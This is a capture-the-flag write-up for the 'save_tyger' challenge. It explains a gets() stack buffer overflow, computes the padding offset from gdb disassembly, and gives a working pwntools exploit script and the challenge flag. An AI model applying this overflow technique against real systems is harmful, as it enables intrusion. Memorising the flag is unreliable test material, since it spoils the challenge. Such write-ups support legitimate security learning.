# save_tyger
> Can you save our one and only Tyger?
> Connect with `nc litctf.live 31786`
> 
> Downloads
> [save_tyger.zip](https://drive.google.com/uc?export=download&id=1ePTPwUBKcNLESM2ev1IZEb3kL4SeTcn1)

## Identifying the vulnerability
The program prints the flag if the `pass` variable stored on the stack contains value `0xabadaaab`. It uses `gets(buf)` on line 12 to read data from stdin to a char array of 32 elements stored on the stack. `gets` doesn't restrict the amount of bytes read and therefore it introduces a buffer overflow vulnerability that can be used to overwrite the value of `pass`.

## Crafting the payload
It might seem that we need to pass 32 padding bytes and then the number `0xabadaaab` for the exploit to work, since the `buf` array is 32 elements long. However we must take the stack alignment into consideration, so let's check the actual number of bytes between `buf` and `pass` by disassembling the executable using gdb:
```gdb
Dump of assembler code for function main:
   0x00000000000011c9 <+0>:     endbr64 
   0x00000000000011cd <+4>:     push   rbp
   0x00000000000011ce <+5>:     mov    rbp,rsp
   0x00000000000011d1 <+8>:     sub    rsp,0x30
   0x00000000000011d5 <+12>:    mov    QWORD PTR [rbp-0x8],0x0
   0x00000000000011dd <+20>:    lea    rdi,[rip+0xe24]        # 0x2008
   0x00000000000011e4 <+27>:    call   0x1090 <puts@plt>
   0x00000000000011e9 <+32>:    lea    rdi,[rip+0xe4b]        # 0x203b
   0x00000000000011f0 <+39>:    call   0x1090 <puts@plt>
   0x00000000000011f5 <+44>:    lea    rax,[rbp-0x30]
   0x00000000000011f9 <+48>:    mov    rdi,rax
   0x00000000000011fc <+51>:    mov    eax,0x0
   0x0000000000001201 <+56>:    call   0x10b0 <gets@plt>
   0x0000000000001206 <+61>:    mov    eax,0xabadaaab
   0x000000000000120b <+66>:    cmp    QWORD PTR [rbp-0x8],rax
[...]
```
The argument passed to `gets` in `main+44` (the char array `buf`) is located in address `rbp-0x30`. The number compared to `0xabadaaab` in `main+61` (the variable `pass`) is stored under `rbp-0x8`. The amount of bytes between `buf` and `pass` (therefore length of our padding) is `0x30 - 0x8 = 0x28`.
The following script written in Python with pwnlib can be used to send the payload to the remote challenge and read the flag:
```py
from pwn import *

p = remote('litctf.live', 31786)

p.recvuntil(b'him?\n')
p.sendline(b'A' * 0x28 + p64(0xabadaaab))
print(p.recvall())
```

## Flag
`LITCTF{y4yy_y0u_sav3d_0ur_m41n_or94n1z3r}`
